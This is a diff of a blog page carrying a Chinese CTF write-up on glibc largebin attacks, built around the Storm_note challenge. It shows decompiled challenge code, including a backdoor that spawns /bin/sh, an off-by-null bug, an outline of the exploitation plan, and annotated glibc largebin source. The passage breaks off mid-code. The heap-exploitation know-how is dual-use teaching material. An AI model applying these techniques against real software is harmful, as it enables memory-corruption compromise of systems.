@@ -7,15 +7,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | CataLpa&#39;s Home</title>
+  <title>Largebin attack | CataLpa&#39;s Home</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="CataLpa&#39;s Home">
-<meta property="og:url" content="http://yoursite.com/archives/page/5/index.html">
+  <meta name="description" content="最近打了西湖论剑预选赛，比赛中一道 pwn 题的利用手法是 largebin attack。largebin attack 在 CTF 比赛中的出现频率比较低，但是一旦出现肯定就是难度较高的题目。今天就来探究一下关于 largebin attack 的相关攻击手段。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Largebin attack">
+<meta property="og:url" content="http://yoursite.com/2019/04/18/largebin_attack/index.html">
 <meta property="og:site_name" content="CataLpa&#39;s Home">
+<meta property="og:description" content="最近打了西湖论剑预选赛，比赛中一道 pwn 题的利用手法是 largebin attack。largebin attack 在 CTF 比赛中的出现频率比较低，但是一旦出现肯定就是难度较高的题目。今天就来探究一下关于 largebin attack 的相关攻击手段。">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/229018/1554990401989-cc38147f-20d0-49d1-97f5-a2637117f105.png#align=left&display=inline&height=570&name=1.png&originHeight=570&originWidth=611&size=81022&status=done&width=611">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/229018/1554990433352-6d83795f-89af-4ee4-879c-d4175d4d1512.png#align=left&display=inline&height=302&name=2.png&originHeight=302&originWidth=624&size=8599&status=done&width=624">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/229018/1554990439900-d559a00c-0099-4b53-9ea3-936e10031bf0.png#align=left&display=inline&height=595&name=3.png&originHeight=595&originWidth=658&size=13304&status=done&width=658">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/jpeg/229018/1554990451787-b7d8bfd2-e45a-41f7-b5b1-e6612082b9a7.jpeg#align=left&display=inline&height=1031&name=5.jpg&originHeight=1031&originWidth=513&size=59621&status=done&width=513">
+<meta property="og:updated_time" content="2019-10-11T03:48:09.706Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CataLpa&#39;s Home">
+<meta name="twitter:title" content="Largebin attack">
+<meta name="twitter:description" content="最近打了西湖论剑预选赛，比赛中一道 pwn 题的利用手法是 largebin attack。largebin attack 在 CTF 比赛中的出现频率比较低，但是一旦出现肯定就是难度较高的题目。今天就来探究一下关于 largebin attack 的相关攻击手段。">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2019/png/229018/1554990401989-cc38147f-20d0-49d1-97f5-a2637117f105.png#align=left&display=inline&height=570&name=1.png&originHeight=570&originWidth=611&size=81022&status=done&width=611">
   
     <link rel="alternative" href="/atom.xml" title="CataLpa&#39;s Home" type="application/atom+xml">
   
@@ -141,350 +150,309 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-largebin_attack" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Largebin attack
+    </h1>
+  
+
+        
+        <a href="/2019/04/18/largebin_attack/" class="archive-article-date">
+  	<time datetime="2019-04-17T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-18</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近打了西湖论剑预选赛，比赛中一道 pwn 题的利用手法是 largebin attack。largebin attack 在 CTF 比赛中的出现频率比较低，但是一旦出现肯定就是难度较高的题目。今天就来探究一下关于 largebin attack 的相关攻击手段。</p>
+<a id="more"></a>
+
+<h2 id="西湖论剑-2019-Storm-note"><a href="#西湖论剑-2019-Storm-note" class="headerlink" title="西湖论剑 2019 Storm_note"></a>西湖论剑 2019 Storm_note</h2><p>这道题不是原创，而是由 0ctf 的 heapstorm2 修改而来，稍稍降低了难度。所有保护全开。</p>
+<p>首先分析题目代码，程序实现了一个常见的 note 管理系统，可以添加，修改和删除 note，另外还有一个 backdoor 函数。</p>
+<p>主函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_proc();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      _isoc99_scanf(<span class="string">"%d"</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">666</span> )</span><br><span class="line">        backdoor();</span><br><span class="line">LABEL_15:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      alloc_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      edit_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>backdoor:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"If you can open the lock, I will let you in"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;buf, <span class="number">0xABCD0100</span>LL, <span class="number">0x30</span>uLL) )</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>add:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">alloc_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span> &amp;&amp; note[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"full!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"size ?"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">1048575</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      note[i] = <span class="built_in">calloc</span>(v1, <span class="number">1u</span>LL);</span><br><span class="line">      note_size[i] = v1;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid size"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>edit:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Index ?"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">15</span> &amp;&amp; note[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Content: "</span>);</span><br><span class="line">    v2 = read(<span class="number">0</span>, note[v1], note_size[v1]);</span><br><span class="line">    *(note[v1] + v2) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid index"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>delete:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">delete_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Index ?"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">15</span> &amp;&amp; note[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(note[v1]);</span><br><span class="line">    note[v1] = <span class="number">0L</span>L;</span><br><span class="line">    note_size[v1] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid index"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞在 edit 函数中，编辑一个堆块后，会在编辑的内容最后补零，导致了 off-by-null，off-by-null 的经典利用手段是构造堆块合并，从而修改 chunk 的结构。</p>
+<p>另外查看程序的 init 函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> init_proc()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !mallopt(<span class="number">1</span>, <span class="number">0</span>) )                         <span class="comment">// 不会使用 fastbin</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( mmap(<span class="number">0xABCD0000</span>LL, <span class="number">4096u</span>LL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L) != <span class="number">0xABCD0000</span>LL )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  result = read(fd, <span class="number">0xABCD0100</span>LL, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">0x30</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里用到了一个特别的函数 mallopt，在网上搜索相关信息得知，这个函数是用来控制 malloc 各种参数的，比如可以使用它设置 fastbin 的最大值 MAX_FAST 等。mallopt(1, 0) 的含义是不使用 fastbin 链表，也就是说当释放一个本属于 fastbin 范围的 chunk，它不会进入到 fastbin，而是会进入 unsorted bin。</p>
+<p>另外调用了 mmap 函数在 0xABCD0000 地址开辟了空间，并且读入了 0x30 大小的随机数，在 backdoor 函数中，如果能够猜对随机数，就能 getshell。</p>
+<p>那么一个显然的思路就是通过利用漏洞来控制 mmap 的内存，修改其中的随机数，由于程序只存在 off-by-null 漏洞，并且禁用了 fastbin 链表，所以只能通过 largebin attack 获得任意地址写的能力。</p>
+<p>简单说一下思路，先通过 off-by-null 来构造堆块重叠，在重叠的堆块中控制 largebin chunk 的 bk 和 bk_nextsize 这两个字段，当 largebin chunk 从 unsortedbin 中卸下并链接到 largebin 的过程中，会发生指针的读写，从而在 mmap 地址分配一个堆块，修改随机数为我们想要的值。</p>
+<h2 id="What-is-largebin"><a href="#What-is-largebin" class="headerlink" title="What is largebin"></a>What is largebin</h2><p>知己知彼方能百战百胜，largebin 的结构和其他链表都不相同，而且更加复杂。</p>
+<p>首先，largebin chunk 中有 fd 和 bk 指针，另外还有 fd_nextsize 和 bk_nextsize 这两个指针。</p>
+<p>largebin 的结构：</p>
+<p>largebin 也分为很多个 index，每个 index 的堆块处在一定的范围内，第一条链表编号为 64，范围是 [0x400, 0x440)，第二条是 65，范围是 [0x440, 0x480)，以此类推。</p>
+<p>largebin 堆块可以理解为链表数组，chunk 的 size 按照从大到小顺序排列，largebin 维护了两个链表，一个是纵向的由 fd、bk 组成的普通链表，另一个是横向的由 fd_nextsize、bk_nextsize 组成的 size 链表。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/229018/1554990401989-cc38147f-20d0-49d1-97f5-a2637117f105.png#align=left&display=inline&height=570&name=1.png&originHeight=570&originWidth=611&size=81022&status=done&width=611" alt="1.png"></p>
+<p>每一条纵向链表的 chunk size 是相同的。</p>
+<p>当一个堆块被 free 之后(除 fastbin 之外)，会先进入到 unsortedbin 中，当再次分配堆块的时候，不符合分配大小的堆块就会被分别插入到对应的链表中去，当一个堆块被插入到 largebin 中时，对应的 glibc 源代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(size)) &#123;</span><br><span class="line">  victim_index = smallbin_index(size);</span><br><span class="line">  bck = bin_at(av, victim_index);</span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">  victim_index = largebin_index(size);</span><br><span class="line">  bck = bin_at(av, victim_index);</span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">  <span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">    <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">    size |= PREV_INUSE;</span><br><span class="line">    <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">    assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line">      fwd = bck;</span><br><span class="line">      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">        &#123;</span><br><span class="line">    fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">    assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">        fwd = fwd-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">      bck = fwd-&gt;bk;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      mark_bin(av, victim_index);</span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
+
+<p>第一种情况，取出的 chunk size 比当前链表中最小的 chunk 还小，这时就可以直接将堆块插入到横向链表的最后，设置好 bk_nextsize、fd_nextsize 两个指针，这个插入过程和普通链表处理类似。</p>
+<p>如果堆块的 size 比最小的堆块大一些，就需要从横向链表头部开始遍历，直到找到第一个 size 大于等于待插入 chunk 的链表。当找到这样一个链表之后，判断链表的 size 是否精确等于待插入 chunk 的 size，如果是，直接将这个 chunk 插入到当前纵向链表的第二个位置，否则(待插入 chunk 的 size 比当前纵向链表头结点的 size 大)会将新的 chunk 作为当前纵向链表的头结点，插入到横向链表中。</p>
+<p>另外，如果 largebin 是空的，则直接将 chunk 的 fd_nextsize bk_nextsize 更新成自身。</p>
+<p>以上就是堆块插入 largebin 的大致流程，首先处理  fd_nextsize  bk_nextsize  构成的横向链表，然后处理纵向链表。</p>
+<p>总结出如下规则(相同idx下)</p>
+<ul>
+<li>按照大小从大到小排序</li>
+<li>若大小相同,按照free时间排序</li>
+<li>若干个大小相同的堆块,只有首堆块的<code>fd_nextsize</code>和<code>bk_nextsize</code>会指向其他堆块,后面的堆块的<code>fd_nextsize</code>和<code>bk_nextsize</code>均为0</li>
+<li>size最大的chunk的<code>bk_nextsize</code>指向最小的chunk; size最小的chunk的<code>fd_nextsize</code>指向最大的chunk</li>
+</ul>
+<p>我们大致了解向 largebin 插入堆块的流程，但是 从 largebin 卸下堆块的时候也涉及一些有趣的地方。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range(nb)) &#123;    <span class="comment">// 判断 nb 是不是 smallbin</span></span><br><span class="line">      bin = bin_at(av, idx);    <span class="comment">// 获取链表 (idx 是之前计算的 nb 在 largebin 链表的 index)</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">      <span class="keyword">if</span> ((victim = first(bin)) != bin &amp;&amp;</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb)) &#123;  <span class="comment">// 检查对应的链表是否为空，或者其中最大的堆块比 nb 还小？</span></span><br><span class="line"></span><br><span class="line">  victim = victim-&gt;bk_nextsize;</span><br><span class="line">  <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size = chunksize(victim)) &lt;</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb)))    <span class="comment">// 开始遍历 largebin，尝试找到一个合适的堆块</span></span><br><span class="line">    victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">     list does not have to be rerouted.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim != last(bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">    victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">  remainder_size = size - nb;  <span class="comment">// 找到一个合适的堆块，计算一下切割后剩余的堆块大小</span></span><br><span class="line">  